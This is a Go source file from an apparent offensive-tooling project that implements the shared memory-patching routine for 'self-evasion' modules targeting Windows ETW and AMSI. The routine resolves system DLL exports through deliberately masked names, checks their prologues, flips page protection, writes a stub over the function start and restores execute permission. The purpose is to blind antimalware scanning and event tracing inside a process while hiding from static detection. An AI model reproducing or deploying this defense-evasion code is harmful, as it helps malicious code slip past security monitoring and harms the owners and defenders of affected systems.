//go:build windows

package research

// Shared Windows plumbing for the self-evasion modules (ETW + AMSI).
//
// The two telemetry-neuter patches are the same operation on a different
// target, so the memory-editing primitive lives here once: resolve the export,
// read its prologue, and — if it is not already patched — flip the page to
// RW, write the stub, flip it back to RX and flush the instruction cache. No
// page is ever writable and executable at the same time (W^X).

import (
	"bytes"
	"errors"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/DevCop95/obliteratus/internal/winname"
)

// errAlreadyPatched signals an idempotent re-application of a stub.
var errAlreadyPatched = errors.New("already patched")

// System DLL handles. The library and export names live masked in
// names_windows.go, so neither appears as plaintext in the binary; the
// plaintext exists only in memory.
var (
	kernel32 = windows.NewLazySystemDLL(winname.LibKernel32)
	ntdll    = windows.NewLazySystemDLL(winname.LibNtdll)
	amsiDLL  = windows.NewLazySystemDLL(winname.LibAmsi)

	procReadProcMem  = kernel32.NewProc(winname.ReadProcMem)
	procWriteProcMem = kernel32.NewProc(winname.WriteProcMem)
	procVirtualProt  = kernel32.NewProc(winname.VirtProtect)
	procFlushICache  = kernel32.NewProc(winname.FlushICache)
)

// page protection constants.
const (
	pageReadWrite   = 0x04 // PAGE_READWRITE
	pageExecuteRead = 0x20 // PAGE_EXECUTE_READ
)

// patchPrologue overwrites the first len(stub) bytes of proc's export address
// in the current process. It returns the patched address, or errAlreadyPatched
// when the bytes already equal stub.
func patchPrologue(proc *windows.LazyProc, stub []byte) (uintptr, error) {
	if len(stub) == 0 {
		return 0, errors.New("empty patch stub")
	}
	if err := proc.Find(); err != nil {
		return 0, fmt.Errorf("resolve %s: %w", proc.Name, err)
	}
	addr := proc.Addr()
	n := uintptr(len(stub))
	self := uintptr(windows.CurrentProcess())

	cur := make([]byte, len(stub))
	var read uintptr
	r, _, _ := procReadProcMem.Call(self, addr, uintptr(unsafe.Pointer(&cur[0])), n, uintptr(unsafe.Pointer(&read)))
	if r == 0 || read != n {
		return 0, fmt.Errorf("read %s prologue", proc.Name)
	}
	if bytes.Equal(cur, stub) {
		return 0, errAlreadyPatched
	}

	var old uint32
	r, _, _ = procVirtualProt.Call(addr, n, pageReadWrite, uintptr(unsafe.Pointer(&old)))
	if r == 0 {
		return 0, fmt.Errorf("VirtualProtect(RW) refused on %s (already hooked by something else?)", proc.Name)
	}

	var wrote uintptr
	r, _, _ = procWriteProcMem.Call(self, addr, uintptr(unsafe.Pointer(&stub[0])), n, uintptr(unsafe.Pointer(&wrote)))
	ok := r != 0 && wrote == n
	r2, _, _ := procVirtualProt.Call(addr, n, pageExecuteRead, uintptr(unsafe.Pointer(&old)))
	procFlushICache.Call(self, addr, n)
	if !ok || r2 == 0 {
		return 0, fmt.Errorf("write/RX-restore failed on %s", proc.Name)
	}
	return addr, nil
}
